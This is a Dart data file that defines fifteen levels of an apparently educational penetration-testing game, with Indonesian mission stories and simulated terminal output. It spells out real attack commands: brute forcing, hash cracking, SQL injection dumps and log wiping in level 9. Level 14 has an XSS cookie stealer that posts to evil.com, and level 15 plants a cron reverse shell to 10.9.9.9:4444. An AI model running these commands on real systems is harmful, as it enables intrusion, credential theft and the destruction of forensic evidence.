// lib/data/levels_data.dart
import '../models/level_model.dart';

final List<GameLevel> gameLevels = [
  // ─────────────────────────────────────────────────────────────────────────
  // LEVEL 1-5: INTRODUCTORY EXPLOITATION
  // ─────────────────────────────────────────────────────────────────────────
  GameLevel(
    id: 1,
    name: 'Port Recon Alpha',
    category: 'INTRODUCTORY',
    targetIP: '192.168.1.101',
    objective: 'Scan semua port target dan identifikasi service yang berjalan.',
    briefingText:
        'TARGET TERDETEKSI. IP 192.168.1.101 aktif di jaringan. Mulai dengan port scan untuk pemetaan awal. Waktu 5 menit -- BERGERAK!',
    storyText:
        'Operator, ini XIU dari XiuCorp Security Operations Center.\n\n'
        'Kami mendeteksi aktivitas mencurigakan dari node eksternal di IP 192.168.1.101. '
        'Jaringan ini terhubung ke infrastruktur inti kami di Jl. Kembang Jepun, Surabaya. '
        'Ancaman ini harus dimitigasi SEBELUM mencapai core firewall kami.\n\n'
        'Misi pertamamu: lakukan reconnaissance untuk memetakan semua port terbuka. '
        'Identifikasi service yang berjalan. Setiap informasi kritis untuk tahap selanjutnya.\n\n'
        'XiuCorp mengandalkanmu. Jangan gagal.',
    commands: [
      LevelCommand(
        command: 'nmap -sV 192.168.1.101',
        hint: 'Gunakan nmap dengan flag -sV untuk scan versi service',
        keywords: ['nmap', '192.168.1.101'],
        outputSuccess:
            'Starting Nmap 7.94\nDiscovered open port 22/tcp on 192.168.1.101\nDiscovered open port 80/tcp on 192.168.1.101\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1\n80/tcp open  http    Apache httpd 2.4.41\n[+] Scan complete. 2 ports open.',
        outputFail:
            '[ERROR] Command not recognized. Hint: nmap -sV <target_ip>',
      ),
      LevelCommand(
        command: 'nc 192.168.1.101 80',
        hint: 'Hubungkan ke port HTTP menggunakan netcat (nc)',
        keywords: ['nc', '192.168.1.101', '80'],
        outputSuccess:
            'Connection established to 192.168.1.101:80\nHTTP/1.1 200 OK\nServer: Apache/2.4.41\n[+] Banner grab successful. System identified.',
        outputFail:
            '[ERROR] Invalid syntax. Hint: nc <target_ip> <port>',
      ),
    ],
  ),

  GameLevel(
    id: 2,
    name: 'Service Fingerprint',
    category: 'INTRODUCTORY',
    targetIP: '10.0.0.45',
    objective:
        'Lakukan fingerprinting OS dan ambil banner service SSH target.',
    briefingText:
        'Target baru: 10.0.0.45. Intel menunjukkan ada SSH yang berjalan. Identifikasi OS dan versi exak service. Mulai fingerprinting!',
    storyText:
        'Laporan intel XiuCorp mengonfirmasi bahwa node 10.0.0.45 merupakan bagian dari '
        'cluster server cadangan kami di Surabaya. Namun, akses SSH dari IP tidak dikenal terdeteksi.\n\n'
        'Kemungkinan besar ada aktor jahat yang telah menanam backdoor di server ini. '
        'Tugasmu: identifikasi OS dan versi service untuk menentukan vector serangan yang tepat.\n\n'
        'Tim forensik kami di Kya-Kya sedang menunggu laporanmu. Lanjutkan!',
    commands: [
      LevelCommand(
        command: 'nmap -O 10.0.0.45',
        hint: 'Gunakan flag -O untuk OS detection',
        keywords: ['nmap', '-O', '10.0.0.45'],
        outputSuccess:
            'OS detection results:\nRunning: Linux 5.4\nOS CPE: cpe:/o:linux:linux_kernel:5.4\n[+] OS: Ubuntu 20.04 LTS confirmed.',
        outputFail: '[ERROR] Missing OS flag. Hint: nmap -O <target>',
      ),
      LevelCommand(
        command: 'nc 10.0.0.45 22',
        hint: 'Grab SSH banner dengan netcat ke port 22',
        keywords: ['nc', '10.0.0.45', '22'],
        outputSuccess:
            'SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5\n[+] SSH Banner grabbed. Version confirmed: OpenSSH 8.2p1',
        outputFail: '[ERROR] Wrong target or port. Hint: nc <ip> 22',
      ),
    ],
  ),

  GameLevel(
    id: 3,
    name: 'Open Port Strike',
    category: 'INTRODUCTORY',
    targetIP: '172.16.0.20',
    objective:
        'Temukan port terbuka dengan full scan dan eksploitasi FTP anonymous.',
    briefingText:
        'IP 172.16.0.20 terdeteksi memiliki service terbuka. Scan semua port lalu cari celah. FTP anonymous mungkin aktif!',
    storyText:
        'Operator, XiuCorp SOC menerima laporan bahwa server di 172.16.0.20 -- yang merupakan '
        'backup storage untuk data klien kami di kawasan Kembang Jepun -- memiliki konfigurasi FTP yang rentan.\n\n'
        'Anonymous access kemungkinan besar masih aktif. Jika benar, ini bisa menjadi '
        'pintu masuk bagi sindikat peretas untuk mencuri data sensitif klien.\n\n'
        'Full port scan segera, lalu eksploitasi FTP anonymous. Kecepatan adalah kunci!',
    commands: [
      LevelCommand(
        command: 'nmap -p- 172.16.0.20',
        hint: 'Scan SEMUA port dengan flag -p-',
        keywords: ['nmap', '-p-', '172.16.0.20'],
        outputSuccess:
            'Scanning 65535 ports...\n21/tcp open  ftp\n22/tcp open  ssh\n8080/tcp open  http-proxy\n[+] 3 open ports found. FTP on port 21 detected!',
        outputFail: '[ERROR] Incomplete scan. Hint: nmap -p- <target>',
      ),
      LevelCommand(
        command: 'ftp 172.16.0.20',
        hint: 'Hubungkan ke FTP server target',
        keywords: ['ftp', '172.16.0.20'],
        outputSuccess:
            'Connected to 172.16.0.20.\n220 vsftpd 3.0.3\nName: anonymous\n331 Please specify the password.\nPassword: \n230 Login successful.\n[+] ANONYMOUS LOGIN ACCEPTED! Access granted.',
        outputFail: '[ERROR] Connection refused. Hint: ftp <target_ip>',
      ),
    ],
  ),

  GameLevel(
    id: 4,
    name: 'Network Topology Map',
    category: 'INTRODUCTORY',
    targetIP: '192.168.0.0/24',
    objective: 'Peta seluruh subnet dengan ping sweep dan traceroute ke gateway.',
    briefingText:
        'Jaringan 192.168.0.0/24 perlu dipetakan. Temukan semua host aktif, lalu traceroute ke gateway untuk memahami topologi.',
    storyText:
        'XiuCorp SOC sedang melakukan audit keamanan jaringan internal. Subnet 192.168.0.0/24 '
        'mencakup beberapa server kritis di gedung pusat Kya-Kya.\n\n'
        'Sebelum kita bisa melindungi jaringan ini, kita harus memahami topologinya. '
        'Temukan semua host aktif, identifikasi gateway, dan peta jalur paket.\n\n'
        'Data ini akan digunakan untuk memperkuat pertahanan perimeter kami. '
        'Jaringan yang tidak dikenal adalah jaringan yang tidak terlindungi.',
    commands: [
      LevelCommand(
        command: 'nmap -sn 192.168.0.0/24',
        hint: 'Ping sweep subnet dengan nmap -sn (no port scan)',
        keywords: ['nmap', '-sn', '192.168.0'],
        outputSuccess:
            'Nmap scan report for 192.168.0.1 (gateway) [host up]\nNmap scan report for 192.168.0.5 [host up]\nNmap scan report for 192.168.0.12 [host up]\nNmap scan report for 192.168.0.44 [host up]\n[+] 4 hosts discovered on subnet.',
        outputFail: '[ERROR] Invalid sweep. Hint: nmap -sn <subnet/cidr>',
      ),
      LevelCommand(
        command: 'traceroute 192.168.0.1',
        hint: 'Traceroute ke gateway untuk memetakan jalur paket',
        keywords: ['traceroute', '192.168.0.1'],
        outputSuccess:
            'traceroute to 192.168.0.1\n 1  192.168.0.254  1.2 ms\n 2  192.168.0.1    2.1 ms\n[+] 2 hops to gateway. Route mapped successfully.',
        outputFail:
            '[ERROR] Wrong destination. Hint: traceroute <gateway_ip>',
      ),
    ],
  ),

  GameLevel(
    id: 5,
    name: 'Vuln Scanner',
    category: 'INTRODUCTORY',
    targetIP: '10.10.10.5',
    objective:
        'Jalankan NSE vulnerability scripts pada target untuk menemukan CVE.',
    briefingText:
        'Target 10.10.10.5 diduga memiliki vulnerability. Gunakan Nmap Scripting Engine (NSE) untuk deteksi otomatis!',
    storyText:
        'Operator, XiuCorp Threat Intelligence mendeteksi anomali pada server 10.10.10.5. '
        'Server ini merupakan edge node yang melindungi akses ke data center utama kami.\n\n'
        'Kecurigaan kami: sindikat peretas sudah menanam exploit yang menunggu waktu yang tepat. '
        'Gunakan NSE vulnerability scanner untuk mendeteksi CVE yang mungkin ada.\n\n'
        'Jika ditemukan celah kritis, kita harus eksploitasi SEKARANG sebelum mereka melakukannya. '
        'Waktu kita melawan kita.',
    commands: [
      LevelCommand(
        command: 'nmap --script vuln 10.10.10.5',
        hint: 'Jalankan semua vuln scripts dengan --script vuln',
        keywords: ['nmap', 'vuln', '10.10.10.5'],
        outputSuccess:
            'Running NSE vulnerability scripts...\n[+] CVE-2021-41773 DETECTED on port 443\n[+] ms17-010 (EternalBlue) vulnerability found on port 445\nRisk Level: CRITICAL\n[+] Vulnerability scan complete. 2 critical CVEs found!',
        outputFail:
            '[ERROR] Script not found. Hint: nmap --script vuln <target>',
      ),
      LevelCommand(
        command: 'nmap --script exploit -p 445 10.10.10.5',
        hint: 'Jalankan exploit script pada port 445 yang rentan',
        keywords: ['nmap', 'exploit', '445', '10.10.10.5'],
        outputSuccess:
            'Attempting ms17-010 exploit...\nSending exploit payload to 445/tcp...\n[+] EXPLOIT SUCCESSFUL! Shell access obtained.\n[+] Level 5 COMPLETE — Introductory phase mastered!',
        outputFail:
            '[ERROR] Invalid script or port. Hint: nmap --script exploit -p <port> <ip>',
      ),
    ],
  ),

  // ─────────────────────────────────────────────────────────────────────────
  // LEVEL 6-10: INTERMEDIATE EXPLOITATION
  // ─────────────────────────────────────────────────────────────────────────
  GameLevel(
    id: 6,
    name: 'SSH Brute Force',
    category: 'INTERMEDIATE',
    targetIP: '192.168.2.50',
    objective:
        'Lakukan brute force pada SSH menggunakan wordlist untuk mendapat akses.',
    briefingText:
        'Server SSH di 192.168.2.50 menggunakan password lemah. Hydra dapat membobol -- gunakan wordlist rockyou!',
    storyText:
        'Laporan dari XiuCorp Red Team: server staging di 192.168.2.50 masih menggunakan '
        'kredensial default yang lemah. Server ini menyimpan source code internal yang SANGAT sensitif.\n\n'
        'Sindikat peretas GLOBAL sedang aktif mencari celah seperti ini. Jika mereka masuk duluan, '
        'seluruh codebase XiuCorp bisa bocor ke publik.\n\n'
        'Kamu harus masuk duluan. Brute force SSH dengan wordlist rockyou. '
        'Temukan kredensial yang lemah dan kuasai server ini.',
    commands: [
      LevelCommand(
        command: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.2.50',
        hint: 'Gunakan hydra dengan -l (user) dan -P (wordlist) untuk SSH brute force',
        keywords: ['hydra', 'rockyou', 'ssh', '192.168.2.50'],
        outputSuccess:
            'Hydra v9.5 starting...\n[DATA] attacking ssh://192.168.2.50:22\n[22][ssh] host: 192.168.2.50   login: admin   password: p@ssw0rd123\n[+] CREDENTIAL FOUND! admin:p@ssw0rd123',
        outputFail:
            '[ERROR] Invalid syntax. Hint: hydra -l <user> -P <wordlist> ssh://<ip>',
      ),
      LevelCommand(
        command: 'ssh admin@192.168.2.50',
        hint: 'Login ke SSH dengan credential yang sudah ditemukan',
        keywords: ['ssh', 'admin', '192.168.2.50'],
        outputSuccess:
            'admin@192.168.2.50 password: p@ssw0rd123\nWelcome to Ubuntu 20.04.3 LTS\nadmin@server:\$ \n[+] SSH ACCESS GRANTED! You are in!',
        outputFail:
            '[ERROR] Wrong syntax. Hint: ssh <user>@<ip>',
      ),
    ],
  ),

  GameLevel(
    id: 7,
    name: 'FTP Anonymous Pwn',
    category: 'INTERMEDIATE',
    targetIP: '10.20.30.40',
    objective:
        'Eksploitasi FTP anonymous login dan exfiltrate file sensitif dari server.',
    briefingText:
        'Server FTP di 10.20.30.40 mengizinkan anonymous login. Masuk dan cari file config yang tersimpan di sana!',
    storyText:
        'Operator, ini situasi darurat. Server FTP di 10.20.30.40 merupakan backup database '
        'untuk seluruh klien XiuCorp di wilayah Jawa Timur.\n\n'
        'Anonymous access masih aktif -- ini celah KEAMANAN KRITIS. '
        'Ada indikasi bahwa file konfigurasi database dengan kredensial production tersimpan di sana.\n\n'
        'Eksploitasi akses anonymous, cari file konfigurasi, dan exfiltrate data sensitifnya. '
        'Kita harus memastikan tidak ada yang bisa menyalahgunakan akses ini.',
    commands: [
      LevelCommand(
        command: 'ftp 10.20.30.40',
        hint: 'Koneksikan ke FTP server',
        keywords: ['ftp', '10.20.30.40'],
        outputSuccess:
            'Connected to 10.20.30.40.\nName (10.20.30.40:anonymous): anonymous\nPassword: \n230 Login successful.\nftp> ',
        outputFail: '[ERROR] Bad connection. Hint: ftp <target>',
      ),
      LevelCommand(
        command: 'ls -la',
        hint: 'List semua file termasuk hidden files',
        keywords: ['ls'],
        outputSuccess:
            'drwxr-xr-x  3 ftp  ftp  4096 Jan 12 .hidden\n-rw-r--r--  1 ftp  ftp  1234 Jan 12 db_config.txt\n-rw-r--r--  1 ftp  ftp   512 Jan 12 .env\n[+] Sensitive files detected!',
        outputFail: '[ERROR] Wrong command. Hint: ls -la',
      ),
      LevelCommand(
        command: 'get db_config.txt',
        hint: 'Download file konfigurasi database',
        keywords: ['get', 'db_config'],
        outputSuccess:
            'local: db_config.txt remote: db_config.txt\n226 Transfer complete.\n[+] FILE EXFILTRATED!\nContent: DB_HOST=192.168.1.200 DB_USER=root DB_PASS=Sup3rS3cr3t!',
        outputFail: '[ERROR] File not found. Hint: get <filename>',
      ),
    ],
  ),

  GameLevel(
    id: 8,
    name: 'Firewall Bypass',
    category: 'INTERMEDIATE',
    targetIP: '192.168.5.100',
    objective:
        'Bypass firewall menggunakan packet fragmentation dan decoy scanning.',
    briefingText:
        'Target 192.168.5.100 dilindungi firewall. Gunakan teknik fragmentasi dan decoy untuk menembus pertahanannya!',
    storyText:
        'Target 192.168.5.100 adalah gateway utama yang melindungi infrastructure penting XiuCorp. '
        'Firewall-nya dikonfigurasi ketat -- IDS/IPS aktif dan logging semua traffic mencurigakan.\n\n'
        'Tapi ada celah: firewall rule kita belum mengantisipasi fragmentasi paket. '
        'Gunakan teknik fragmentation untuk bypass, lalu decoy scan untuk menyembunyikan jejakmu.\n\n'
        'Jika kita bisa menembus gateway ini, kita akan punya akses ke seluruh segmen jaringan internal. '
        'Ini momen kritis.',
    commands: [
      LevelCommand(
        command: 'nmap -f 192.168.5.100',
        hint: 'Gunakan flag -f untuk packet fragmentation bypass',
        keywords: ['nmap', '-f', '192.168.5.100'],
        outputSuccess:
            'Fragmented packet scan initiated...\nFirewall rule evasion: ACTIVE\n80/tcp  open  http\n443/tcp open  https\n[+] Firewall bypassed via fragmentation!',
        outputFail: '[ERROR] Blocked by firewall. Hint: nmap -f <target>',
      ),
      LevelCommand(
        command: 'nmap -D RND:5 192.168.5.100',
        hint: 'Gunakan decoy scan -D RND:5 untuk menyembunyikan IP asli',
        keywords: ['nmap', '-D', 'RND', '192.168.5.100'],
        outputSuccess:
            'Decoy scan with 5 random IPs...\nTarget sees traffic from multiple sources\nIDS/IPS evasion: SUCCESSFUL\n[+] Real attacker IP concealed. Scan complete!',
        outputFail:
            '[ERROR] Decoy failed. Hint: nmap -D RND:5 <target>',
      ),
    ],
  ),

  GameLevel(
    id: 9,
    name: 'Log Wiper',
    category: 'INTERMEDIATE',
    targetIP: '10.0.1.15',
    objective:
        'Akses auth log dan hapus jejak aktivitas hacking dari sistem target.',
    briefingText:
        'Kamu sudah masuk ke 10.0.1.15. Sekarang bersihkan jejakmu! Hapus auth.log dan bash_history sebelum admin sadar!',
    storyText:
        'Operator, kamu sudah berhasil masuk ke 10.0.1.15 -- server monitoring XiuCorp di Kya-Kya.\n\n'
        'Masalahnya: setiap perintahmu terekam di auth.log dan bash_history. '
        'Jika admin sistem menemukan jejakmu, mereka akan mengunci seluruh infrastruktur dan kita kehilangan akses.\n\n'
        'Bersihkan jejakmu. Hapus auth.log entries yang mencurigakan, '
        'dan kosongkan bash_history. Jadilah ghost -- tidak ada yang tahu kamu pernah di sini.',
    commands: [
      LevelCommand(
        command: 'cat /var/log/auth.log',
        hint: 'Lihat isi auth log untuk identifikasi entry berbahaya',
        keywords: ['cat', 'auth.log'],
        outputSuccess:
            'Jan 12 09:15:01 server sshd: Accepted password for root\nJan 12 09:15:03 server sshd: session opened for user root\nJan 12 09:16:45 server sshd: session closed\n[+] Log entries identified. 3 suspicious entries found.',
        outputFail: '[ERROR] File not accessible. Hint: cat /var/log/auth.log',
      ),
      LevelCommand(
        command: 'sed -i "/Jan 12/d" /var/log/auth.log',
        hint: 'Hapus baris yang mengandung tanggal akses dengan sed -i',
        keywords: ['sed', '-i', 'auth.log'],
        outputSuccess:
            'Removing matching entries from auth.log...\n3 entries deleted.\n[+] AUTH LOG CLEANED! Evidence removed.',
        outputFail: '[ERROR] Sed syntax wrong. Hint: sed -i "/<pattern>/d" <file>',
      ),
      LevelCommand(
        command: 'echo "" > ~/.bash_history',
        hint: 'Kosongkan bash history untuk menghapus riwayat command',
        keywords: ['bash_history', 'history'],
        outputSuccess:
            'bash_history cleared.\n[+] Command history wiped!\n[+] All forensic traces eliminated. Ghost mode: ACTIVE.',
        outputFail:
            '[ERROR] History not cleared. Hint: echo "" > ~/.bash_history',
      ),
    ],
  ),

  GameLevel(
    id: 10,
    name: 'Hash Cracker',
    category: 'INTERMEDIATE',
    targetIP: '172.20.10.8',
    objective: 'Crack password hash MD5 dari file shadow dan login ke sistem.',
    briefingText:
        'File /etc/shadow dari 172.20.10.8 sudah di-dump. Ada hash MD5 yang perlu di-crack. Gunakan john atau hashcat!',
    storyText:
        'XiuCorp Red Team berhasil mengekstrak file /etc/shadow dari 172.20.10.8 -- '
        'server authentication yang mengelola seluruh akses VPN karyawan.\n\n'
        'Ada hash MD5 yang harus di-crack. Jika berhasil, kita akan memiliki akses root ke server ini. '
        'Dari sini, kita bisa mematikan VPN tunnel yang dikompromikan dan memulihkan keamanan akses.\n\n'
        'Gunakan John the Ripper dengan wordlist rockyou. Setelah password ter-crack, '
        'login langsung sebagai root. Waktu sangat terbatas.',
    commands: [
      LevelCommand(
        command: 'john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt',
        hint: 'Gunakan john dengan format MD5 dan wordlist rockyou',
        keywords: ['john', 'md5', 'rockyou', 'hash'],
        outputSuccess:
            'Loaded 1 password hash (md5crypt, crypt(3) \$1\$ (and variants))\nPress Ctrl+C to abort, or send SIGUSR1\nroot:letmein2024    (root)\n[+] PASSWORD CRACKED: root:letmein2024',
        outputFail:
            '[ERROR] Wrong format or syntax. Hint: john --format=md5crypt --wordlist=<path> <hashfile>',
      ),
      LevelCommand(
        command: 'ssh root@172.20.10.8',
        hint: 'Login sebagai root dengan password yang sudah di-crack',
        keywords: ['ssh', 'root', '172.20.10.8'],
        outputSuccess:
            'root@172.20.10.8 password: letmein2024\nWelcome to Ubuntu Server\nroot@target:\n[+] ROOT ACCESS OBTAINED! Full system control achieved!',
        outputFail: '[ERROR] Connection failed. Hint: ssh root@<ip>',
      ),
    ],
  ),

  // ─────────────────────────────────────────────────────────────────────────
  // LEVEL 11-15: ADVANCED EXPLOITATION
  // ─────────────────────────────────────────────────────────────────────────
  GameLevel(
    id: 11,
    name: 'SSL/TLS Crackdown',
    category: 'ADVANCED',
    targetIP: '203.0.113.50',
    objective:
        'Identifikasi cipher lemah pada HTTPS target dan eksploitasi konfigurasi SSL yang salah.',
    briefingText:
        'Target 203.0.113.50 menggunakan SSL/TLS dengan cipher yang deprecated. Gunakan openssl untuk audit dan eksploitasi!',
    storyText:
        'Operator, ini level LANJUTAN. Target 203.0.113.50 adalah payment gateway eksternal '
        'yang digunakan oleh beberapa klien XiuCorp di kawasan Asia Tenggara.\n\n'
        'Intel kami menunjukkan bahwa server ini masih menggunakan cipher RC4-MD5 yang sudah usang. '
        'Ini berarti setiap transaksi finansial yang melalui server ini BISA diintercept.\n\n'
        'Audit SSL/TLS dengan openssl, identifikasi cipher lemah, '
        'dan buktikan bahwa serangan POODLE mungkin dilakukan. '
        'Ini bukan sekadar tes -- ini perlindungan nyata terhadap pencurian data finansial.',
    commands: [
      LevelCommand(
        command: 'openssl s_client -connect 203.0.113.50:443',
        hint: 'Audit SSL certificate dan cipher dengan openssl s_client',
        keywords: ['openssl', 's_client', '203.0.113.50'],
        outputSuccess:
            'CONNECTED(00000003)\nCipher: RC4-MD5 (WEAK!)\nProtocol: TLSv1.0 (DEPRECATED)\nCertificate: EXPIRED (2022-01-01)\n[+] Weak cipher RC4-MD5 detected. TLSv1.0 is exploitable!',
        outputFail:
            '[ERROR] Wrong command. Hint: openssl s_client -connect <ip>:443',
      ),
      LevelCommand(
        command: 'nmap --script ssl-poodle -p 443 203.0.113.50',
        hint: 'Test POODLE vulnerability pada SSL menggunakan NSE script',
        keywords: ['nmap', 'ssl-poodle', '443', '203.0.113.50'],
        outputSuccess:
            'ssl-poodle:\n  VULNERABLE: SSL POODLE information leak\n  State: VULNERABLE\n  Risk factor: HIGH\n  CVE: CVE-2014-3566\n[+] POODLE ATTACK POSSIBLE! SSL downgrade initiated.',
        outputFail:
            '[ERROR] Script not found. Hint: nmap --script ssl-poodle -p 443 <ip>',
      ),
    ],
  ),

  GameLevel(
    id: 12,
    name: 'Root Escalation',
    category: 'ADVANCED',
    targetIP: '10.30.0.100',
    objective:
        'Lakukan privilege escalation dari user biasa ke root menggunakan SUID binary.',
    briefingText:
        'Kamu sudah masuk sebagai www-data di 10.30.0.100. Sekarang naik privilege ke root! Cari SUID binary yang bisa dieksploitasi!',
    storyText:
        'Operator, kamu sudah memiliki akses user biasa ke 10.30.0.100 -- '
        'web server utama portal klien XiuCorp. Tapi kamu hanya www-data.\n\n'
        'Untuk mengambil alih kontrol penuh server ini, kamu butuh akses root. '
        'Cari SUID binary yang bisa dieksploitasi untuk privilege escalation.\n\n'
        'Server ini menjalankan aplikasi kritis yang memproses data jutaan pengguna. '
        'Jika sindikat peretas mengambil alih sebelum kita, dampaknya akan sangat besar. '
        'Naik ke root SEKARANG.',
    commands: [
      LevelCommand(
        command: 'find / -perm -4000 -type f 2>/dev/null',
        hint: 'Cari semua SUID binary dengan find dan permission 4000',
        keywords: ['find', '-perm', '-4000'],
        outputSuccess:
            'SUID binaries found:\n/usr/bin/nmap (3.81)\n/usr/bin/vim.basic\n/bin/bash (writable)\n/usr/bin/python3.8\n[+] nmap 3.81 with SUID bit! This is exploitable!',
        outputFail:
            '[ERROR] Wrong flags. Hint: find / -perm -4000 -type f 2>/dev/null',
      ),
      LevelCommand(
        command: 'nmap --interactive',
        hint: 'Gunakan nmap --interactive untuk mendapatkan shell melalui SUID',
        keywords: ['nmap', '--interactive'],
        outputSuccess:
            'nmap> !sh\n# whoami\nroot\n# id\nuid=0(root) gid=0(root) groups=0(root)\n[+] PRIVILEGE ESCALATION SUCCESS! UID 0 - You are ROOT!',
        outputFail:
            '[ERROR] Cannot escalate. Hint: nmap --interactive then !sh',
      ),
    ],
  ),

  GameLevel(
    id: 13,
    name: 'SQL Injection',
    category: 'ADVANCED',
    targetIP: '192.168.100.200',
    objective:
        'Eksploitasi SQL Injection pada login form web target dan dump database.',
    briefingText:
        'Web app di http://192.168.100.200 memiliki SQL Injection pada form login. Gunakan sqlmap untuk dump seluruh database!',
    storyText:
        'Operator, ini adalah target KRITIS. 192.168.100.200 adalah aplikasi web internal '
        'XiuCorp yang menyimpan data seluruh karyawan di Asia Tenggara -- termasuk data pribadi, '
        'gaji, dan akses sistem.\n\n'
        'Tim keamanan kami menemukan kerentanan SQL Injection pada form login. '
        'Jika sindikat menemukan celah ini duluan, mereka bisa dump SELURUH database.\n\n'
        'Gunakan sqlmap untuk mengeksploitasi vulnerability ini. '
        'Dump database untuk membuktikan dampaknya, lalu laporkan ke tim patching kami. '
        'Kita harus memperbaiki ini sebelum dieksploitasi secara nyata.',
    commands: [
      LevelCommand(
        command: 'sqlmap -u "http://192.168.100.200/login.php?id=1" --dbs',
        hint: 'Gunakan sqlmap dengan flag --dbs untuk enumerate databases',
        keywords: ['sqlmap', '192.168.100.200', '--dbs'],
        outputSuccess:
            '[INFO] Testing SQLite, MySQL, PostgreSQL...\n[+] DBMS identified: MySQL 8.0.28\navailable databases [3]:\n[*] information_schema\n[*] mysql\n[*] users_db\n[+] 3 databases found!',
        outputFail:
            '[ERROR] Invalid URL or flags. Hint: sqlmap -u "<url>?param=1" --dbs',
      ),
      LevelCommand(
        command: 'sqlmap -u "http://192.168.100.200/login.php?id=1" -D users_db --dump',
        hint: 'Dump semua data dari database users_db',
        keywords: ['sqlmap', 'users_db', '--dump'],
        outputSuccess:
            'Database: users_db\nTable: accounts (5 entries)\n+----+----------+--------------+\n| id | username | password     |\n+----+----------+--------------+\n| 1  | admin    | Admin@2024   |\n| 2  | superuser| H@ck3rPr00f  |\n+----+----------+--------------+\n[+] DATABASE DUMPED! Credentials obtained!',
        outputFail:
            '[ERROR] Database not specified. Hint: sqlmap -u "<url>" -D <db> --dump',
      ),
    ],
  ),

  GameLevel(
    id: 14,
    name: 'XSS Payload Injection',
    category: 'ADVANCED',
    targetIP: '172.31.5.88',
    objective:
        'Inject XSS payload pada form komentar dan steal cookie admin.',
    briefingText:
        'Forum di http://172.31.5.88 tidak sanitize input! Inject XSS payload untuk curi cookie session admin. Ini kesempatanmu!',
    storyText:
        'Operator, forum diskusi internal XiuCorp di 172.31.5.88 memiliki kerentanan XSS yang belum diperbaiki. '
        'Forum ini digunakan oleh seluruh tim engineering di Surabaya untuk berdiskusi tentang proyek rahasia.\n\n'
        'Jika seseorang menyuntikkan payload XSS, mereka bisa mencuri session cookie admin '
        'dan mengambil alih kontrol penuh forum -- termasuk membaca semua percakapan rahasia.\n\n'
        'Tugasmu: buktikan bahwa serangan ini mungkin dengan menginject XSS payload '
        'dan mencuri cookie session admin. Ini demonstrasi keamanan, bukan serangan nyata.',
    commands: [
      LevelCommand(
        command: 'curl http://172.31.5.88/comment -d "text=<script>alert(1)</script>"',
        hint: 'Test XSS sederhana dengan alert(1) lewat curl POST',
        keywords: ['curl', '172.31.5.88', 'script', 'alert'],
        outputSuccess:
            'HTTP/1.1 200 OK\nResponse includes payload unescaped: <script>alert(1)</script>\n[+] REFLECTED XSS CONFIRMED! Input not sanitized.',
        outputFail:
            '[ERROR] Wrong syntax. Hint: curl <url> -d "param=<script>...</script>"',
      ),
      LevelCommand(
        command: 'curl http://172.31.5.88/comment -d "text=<script>document.location=\'http://evil.com/steal?c=\'+document.cookie</script>"',
        hint: 'Inject cookie stealer XSS payload ke form komentar',
        keywords: ['curl', '172.31.5.88', 'cookie', 'document'],
        outputSuccess:
            'Payload injected successfully.\nAdmin session cookie received at evil.com:\nsessionid=a3f9b2c7d1e4...\nadmin_token=eyJhbGciOiJIUzI1NiJ9...\n[+] COOKIE STOLEN! Admin session hijacked!',
        outputFail:
            '[ERROR] Payload blocked. Hint: inject document.cookie stealer',
      ),
    ],
  ),

  GameLevel(
    id: 15,
    name: 'SYSTEM ZERO - Full Compromise',
    category: 'ADVANCED',
    targetIP: '10.0.0.1',
    objective:
        'Lakukan full chain attack: recon -> exploit -> escalate -> persistence. Ambil alih seluruh sistem!',
    briefingText:
        'MISI FINAL! Target: 10.0.0.1 -- Server utama XiuCorp. Lakukan full chain attack. Tidak ada yang menghentikanmu. INI SAATNYA!',
    storyText:
        'Operator, ini MISI FINAL. Target: 10.0.0.1 -- server utama XiuCorp di jantung Kya-Kya, Surabaya.\n\n'
        'Sindikat peretas GLOBAL sudah menembus pertahanan luar dan mengancam seluruh infrastruktur kami. '
        'Jika server ini jatuh, seluruh operasi cyber defense di Asia Tenggara akan lumpuh.\n\n'
        'Kamu adalah GARIS PERTAHANAN TERAKHIR. Lakukan full chain attack: '
        'recon -> exploit -> escalate -> persistence. '
        'Ambil alih kendali sistem dan amankan XiuCorp dari ancaman ini.\n\n'
        'Seluruh tim XiuCorp, semua klien kami, dan keamanan siber regional bergantung padamu.\n\n'
        'Jangan gagal. Ini SAATNYA.',
    commands: [
      LevelCommand(
        command: 'nmap -sV -O --script vuln 10.0.0.1',
        hint: 'Full aggressive scan: version + OS + vuln scripts sekaligus',
        keywords: ['nmap', '-sV', 'vuln', '10.0.0.1'],
        outputSuccess:
            'AGGRESSIVE SCAN INITIATED...\n22/tcp SSH OpenSSH 7.4 (VULNERABLE: CVE-2018-10933)\n80/tcp HTTP Apache 2.4.29 (VULNERABLE: CVE-2021-41773)\nOS: Linux 4.15\n[+] CRITICAL VULNERABILITIES FOUND! LibSSH auth bypass available!',
        outputFail:
            '[ERROR] Incomplete scan flags. Hint: nmap -sV -O --script vuln <ip>',
      ),
      LevelCommand(
        command: 'python3 libssh_exploit.py 10.0.0.1 22',
        hint: 'Jalankan exploit CVE-2018-10933 untuk bypass auth SSH LibSSH',
        keywords: ['python3', 'libssh', '10.0.0.1'],
        outputSuccess:
            'CVE-2018-10933 LibSSH Authentication Bypass\nSending malformed auth packet to 10.0.0.1:22...\n[+] AUTH BYPASS SUCCESSFUL!\nShell obtained: root@xiucorp-main:\$ ',
        outputFail:
            '[ERROR] Exploit failed. Hint: python3 <exploit.py> <ip> <port>',
      ),
      LevelCommand(
        command: 'echo "*/5 * * * * /bin/bash -i >& /dev/tcp/10.9.9.9/4444 0>&1" >> /etc/crontab',
        hint: 'Pasang reverse shell cron job untuk persistence',
        keywords: ['crontab', 'cron', '/dev/tcp', 'reverse'],
        outputSuccess:
            'Cron job injected!\n*/5 * * * * reverse shell to 10.9.9.9:4444\n[+] PERSISTENCE ESTABLISHED!\n\n[SYSTEM ZERO COMPROMISED!]\n[FULL ACCESS -- ALL 15 LEVELS DONE!]',
        outputFail:
            '[ERROR] Cron syntax wrong. Hint: echo "<cron>" >> /etc/crontab',
      ),
    ],
  ),
];
